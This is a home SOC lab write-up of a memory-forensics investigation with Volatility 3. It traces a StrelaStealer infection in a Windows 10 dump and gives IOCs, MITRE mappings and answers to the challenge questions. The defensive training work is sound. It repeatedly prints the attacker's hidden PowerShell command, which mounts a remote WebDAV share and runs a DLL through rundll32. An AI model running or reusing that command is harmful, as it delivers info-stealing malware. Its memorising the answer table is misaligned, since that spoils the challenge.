# 🔍 Home SOC Lab 2 — Memory Forensics with Volatility 3

> A hands-on home lab for analyzing a real malware infection using Volatility 3.  
> The investigation uncovers a **StrelaStealer** attack hidden entirely in RAM — no files dropped to disk.

---

## Lab Overview

This lab walks through a full **Memory Forensics investigation** on a Windows 10 memory dump (`192-Reveal.dmp`).  
The goal: answer key forensic questions about an active malware infection using only RAM evidence.

| Detail | Value |
| --- | --- |
| **Memory Dump** | `192-Reveal.dmp` |
| **Platform** | Windows 10 |
| **Victim User** | Elon |
| **Malware Family** | StrelaStealer |
| **Attack Duration** | ⚡ 3 seconds (07:00:03 → 07:00:06 UTC) |

---

## What is Memory Forensics?

Many attacks happen **entirely in RAM** and leave zero traces on disk.  
Tools like Volatility let us take a snapshot of live memory and extract:

- Running processes and their parent-child relationships
- Active network connections
- PowerShell commands executed in the background
- Credentials and registry activity

> **Memory Acquisition** must happen **before** powering off the machine.  
> Every second of delay means lost evidence.  
> Common tools: **FTK Imager**, **Magnet RAM Capture**, **DumpIt**

---

## Attack Summary

The attacker gained access to the victim machine (via phishing, RDP, or similar), then executed a single PowerShell command that:

1. Opened a **hidden PowerShell window** (invisible to the victim)
2. Mounted a remote **WebDAV share** from the attacker's server
3. Executed a malicious **DLL directly from the network** — nothing written to disk

```
PowerShell (hidden)
    └─► net use \\45.9.74.32@8888\davwwwroot\          ← Mount remote share via WebDAV
    └─► rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry   ← Execute DLL from network
            └─► net.exe                                 ← Spawned by PowerShell
            └─► conhost.exe
```

---

## Investigation — Step by Step

### Step 1 — Confirm OS (Always First)

```bash
python vol.py -f '192-Reveal.dmp' windows.info
```

✅ Confirmed: **Windows 10**

---

### Step 2 — List Processes (pstree)

```bash
python vol.py -f '192-Reveal.dmp' windows.pstree
```

Found at the bottom of output:

```
3692  4120  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
  └─ 2416  net.exe
  └─ 6892  conhost.exe
```

> ⚠️ **Red Flag:** `wordpad.exe` and `powershell.exe` both share the same PPID (4120).  
> A document application launching PowerShell = textbook malicious behavior.

---

### Step 3 — Inspect Command Lines (cmdline)

```bash
python vol.py -f '192-Reveal.dmp' windows.cmdline
```

Revealed the full malicious command:

```
-windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

**Command Breakdown:**

| Part | Meaning |
| --- | --- |
| `-windowstyle hidden` | PowerShell runs invisible — victim sees nothing |
| `net use \\45.9.74.32@8888\davwwwroot\` | Mounts a remote folder via WebDAV (port 8888) |
| `rundll32 ...3435.dll,entry` | Executes a DLL from the network — no download to disk |

---

### Step 4 — Identify Sessions (User Context)

```bash
python vol.py -f '192-Reveal.dmp' windows.sessions
```

All malicious processes ran under: **Elon**

---

## Forensic Questions & Answers

| # | Question | Answer |
| --- | --- | --- |
| **Q1** | What is the name of the malicious process? | `powershell.exe` |
| **Q2** | What is the parent PID of the malicious process? | `4120` |
| **Q3** | What is the file name used to execute the second-stage payload? | `3435.dll` |
| **Q4** | What is the name of the shared directory on the remote server? | `davwwwroot` |
| **Q5** | What is the MITRE sub-technique ID used to execute the second-stage payload? | `T1218.011` |
| **Q6** | What is the username that the malicious process runs under? | `Elon` |
| **Q7** | What is the name of the malware family? | `StrelaStealer` |

---

## Why WebDAV Instead of SMB?

| Protocol | Port | Problem for Attacker |
| --- | --- | --- |
| **SMB** | 445 | Blocked by most firewalls and EDR tools |
| **WebDAV** | 80 / 443 / custom | Built on HTTP — passes through firewalls freely |

The attacker used **port 8888** — likely to avoid conflicts with other running services.

---

## Why rundll32?

`rundll32.exe` is a **legitimate Windows binary** located at `C:\Windows\System32\rundll32.exe`.  
Its job: load a `.dll` file and call a specific function inside it.

```
rundll32 hello.dll,entry
    ↓
Windows loads hello.dll
    ↓
Finds the function entry()
    ↓
Executes the code inside it
```

Attackers use it because:
- It's **trusted by Windows** and most security tools
- It runs **code without creating a new .exe**
- This technique is called a **LOLBin** (Living Off the Land Binary)

---

## IOCs — Indicators of Compromise

| Indicator | Value |
| --- | --- |
| **Malicious IP** | `45.9.74.32` |
| **Port** | `8888` |
| **Remote Share** | `davwwwroot` |
| **Malicious DLL** | `3435.dll` |
| **LOLBin Used** | `rundll32.exe` |
| **Technique** | PowerShell hidden window + WebDAV + in-memory DLL |

---

## MITRE ATT&CK Coverage

| ID | Name | Description |
| --- | --- | --- |
| **T1059.001** | PowerShell | Commands executed via hidden PowerShell |
| **T1218.011** | Rundll32 | Malicious DLL loaded via legitimate Windows binary |
| **T1021.002** | SMB/WebDAV Remote Services | Remote folder mounted via WebDAV |
| **T1105** | Ingress Tool Transfer | Payload pulled from attacker-controlled server |
| **T1564** | Hide Artifacts | PowerShell window hidden from victim |

---

## Attack Timeline

| Time (UTC) | Process | Event |
| --- | --- | --- |
| **07:00:03** | `powershell.exe` | Launched hidden — attack begins |
| **07:00:03** | `conhost.exe` | Auto-spawned alongside PowerShell |
| **07:00:06** | `net.exe` | WebDAV share mounted, `3435.dll` fetched |
| **07:00:06** | `svchost.exe` | Malware active in memory |

> ⚡ **Full attack chain completed in 3 seconds.**

---

## Volatility Commands Used

| Command | Purpose |
| --- | --- |
| `windows.info` | Confirm OS version |
| `windows.pstree` | See process tree and parent-child relationships |
| `windows.cmdline` | Extract full command-line arguments for every process |
| `windows.sessions` | Identify which user ran each process |
| `windows.netstat` | Check active network connections |
| `windows.hashdump` | Extract password hashes |

---

## About StrelaStealer

**StrelaStealer** is an info-stealer malware that specifically targets email credentials.  
It focuses on stealing saved login data from **Microsoft Outlook** and **Mozilla Thunderbird**.

The malware was identified by searching the C2 IP (`45.9.74.32`) on **VirusTotal**, which flagged it as associated with active StrelaStealer campaigns.

---

*Built as part of a personal SOC analyst learning journey. All analysis performed on a provided memory dump in an isolated lab environment.*
